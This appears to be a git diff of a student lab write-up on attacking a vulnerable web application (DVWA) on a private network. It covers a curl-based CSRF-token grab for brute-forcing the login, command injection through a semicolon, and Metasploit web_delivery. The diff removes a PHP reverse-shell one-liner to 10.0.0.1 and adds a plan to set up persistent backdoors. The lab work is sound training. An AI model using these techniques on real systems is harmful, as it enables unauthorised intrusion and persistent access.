@@ -12,7 +12,7 @@
 
 ​	The target IP addresses were obtained by a simple Nmap scan.
 
-​	The attack box has the latest release of Kali Linux, and has had Nessus, armitage, and a few other extra utilities installed.  If possible, I plan to restrict the use of the msfconsole or armitage, and try to identify vulnerabilities and develop my own attacks.  The use of the MSF framework would make exploitation of both machines trivial. 
+​	The attack box has the latest release of Kali Linux, and has had Nessus, armitage, and a few other extra utilities installed.  If possible, I plan to restrict the use of the msfconsole or armitage, and try to identify vulnerabilities and develop my own attacks.  The exception will be when venturing to set up persistent backdoors into the system.
 
 
 
@@ -136,7 +136,7 @@ Using Burp Suite to proxy the http requests, you can see that the initial connec
 <input type='hidden' name='user_token' value='25a83cbcfe8ebad257d6416ad9817699' />
 ```
 
-​	This presents a challenge for brute forcing the login page, as each POST request we make to the web server will require the correct values for PHPSESSID and user_token or the request will automatically be rejected.   Burp Suite can be configured to use macros to update any value in a request by issuing a quest immediately before your brute force request, then transferring in the correct values.  In practice, I found this very cumbersome to enable, and was only able to get the correct setup once (before crashing my attack box by turning the worker threads up way too high).  It was simple to get the user_token updated, but there was some configuration I must have changed that disabled the session/cookie handling in Burp, preventing it from updating cookies.  I started to research alternatives, and [what I ultimately found](https://blog.g0tmi1k.com/dvwa/login/) was more elegant, and much faster:
+​	This presents a challenge for brute forcing the login page, as each POST request we make to the web server will require the correct values for PHPSESSID and user_token or the request will automatically be rejected.   Burp Suite can be configured to use macros to update any value in a request by issuing a quest immediately before your brute force request, then transferring in the correct values.  In practice, I found this very cumbersome to enable, and was only able to get the correct setup once (before crashing my attack box by turning the worker threads up way too high).  It was simple to get the user_token updated, but there was some configuration I must have changed that disabled the session/cookie handling in Burp, preventing it from updating cookies.  I started to research alternatives, and [what I ultimately found](https://blog.g0tmi1k.com/dvwa/login/) was more elegant, and much faster:
 
 ```shell
 CSRF=$(curl -s -c dvwa.cookie "192.168.1.210/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
@@ -210,10 +210,7 @@ I guess this Brute Force section would have been much easier to exploit.
 
 ##### C. Obtaining a reverse shell
 
-​	After the length of time on this target just to get to this point, I tried a one-liner PHP shell from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php).
+​	After testing the form, we find that you can enter an IP address and then follow it with a semicolon to execute shell commands on the target. We will start up Metasploit and set up our attack. We will get setup to use the [web_delivery](https://www.offensive-security.com/metasploit-unleashed/web-delivery/) module withing msf
 
-```php
-php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
-```
+![msf](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target2/screens/msfsetup.PNG)
 
-Saved as payload.php, and attempted to upload. 
